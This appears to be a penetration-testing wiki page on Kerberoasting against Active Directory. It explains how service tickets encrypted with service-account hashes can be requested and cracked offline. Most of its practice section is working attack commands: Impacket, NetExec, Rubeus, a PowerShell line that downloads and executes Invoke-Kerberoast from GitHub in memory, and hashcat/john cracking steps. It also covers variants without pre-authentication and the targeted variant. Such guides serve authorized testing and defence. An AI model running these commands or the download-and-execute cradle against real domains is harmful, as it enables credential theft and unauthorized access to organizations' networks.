## Theory

When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the SPN (Service Principal Name) of the service wanted. If the TGT is valid, and if the SPN exists, the KDC sends the ST to the requesting user.

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a SPN for a service, he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. This is Kerberoasting.

## Practice

<Callout type="warn">

Unlike [ASREProasting](/ad/movement/kerberos/roasting/asreproast), this attack usually requires a prior foothold (valid domain credentials). The exception is *Kerberoasting without pre-authentication* (Charlie Clark), which works unauthenticated against accounts that have Kerberos pre-authentication disabled.

</Callout>

<Tabs items={['UNIX-like', 'Windows']}>
<Tab value="UNIX-like">

The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN and valid domain credentials.

```bash
# with a password
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).

```bash
netexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
```

Another alternative is the [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit.

```bash
python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
```

</Tab>

<Tab value="Windows">

The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt
```

This can also be achieved with Powershell. Depending on the tool that the tester will use to attempt cracking the ???, the `-OutputFormat` can be set to `hashcat` or `john`.

```bash
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoastables.txt
```

</Tab>
</Tabs>

[Hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can then be used to try [cracking the hash](/ad/movement/credentials/cracking).

```bash
hashcat -m 13100 kerberoastables.txt $wordlist
```
```bash
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```

### Kerberoasting without pre-authentication

In September 2022, [Charlie Clark](https://twitter.com/exploitph) showed that Service Tickets can be obtained through `AS-REQ` requests (normally used for TGT requests) rather than the usual `TGS-REQ`, and [implemented](https://github.com/GhostPack/Rubeus/pull/139) it for Kerberoasting.

If an attacker knows an account for which pre-authentication is not required (an [ASREProastable](/ad/movement/kerberos/roasting/asreproast) account) plus one or more target service accounts, a Kerberoast can be attempted **without controlling any domain account**, since pre-authentication will not be required.

<Tabs items={['UNIX-like', 'Windows']}>
<Tab value="UNIX-like">

[Impacket](https://github.com/fortra/impacket)'s [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) (Python) supports it with `-no-preauth` (the target SPNs/service names go one per line in `services.txt`).

```bash
GetUserSPNs.py -no-preauth "$PREAUTH_DISABLED_USER" -usersfile "services.txt" -dc-host "$DC_HOST" "$DOMAIN/"
```

</Tab>
<Tab value="Windows">

[Rubeus](https://github.com/GhostPack/Rubeus) (C#) uses `/nopreauth:` and `/spn:`.

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"$DOMAIN" /dc:"$DC_HOST" /nopreauth:"$PREAUTH_DISABLED_USER" /spn:"$TARGET_SPN"
```

</Tab>
</Tabs>

### Targeted Kerberoasting

If an attacker controls an account with the rights to add an SPN to another (`GenericAll`, `GenericWrite`), it can be abused to make that other account vulnerable to Kerberoast (see [exploitation](/ad/movement/dacl/targeted-kerberoasting)).

<Callout type="info">

Controlling a member of the Account Operators group, targeted Kerberoasting can be conducted for the whole domain (see [exploitation](/ad/movement/dacl/targeted-kerberoasting)).

</Callout>
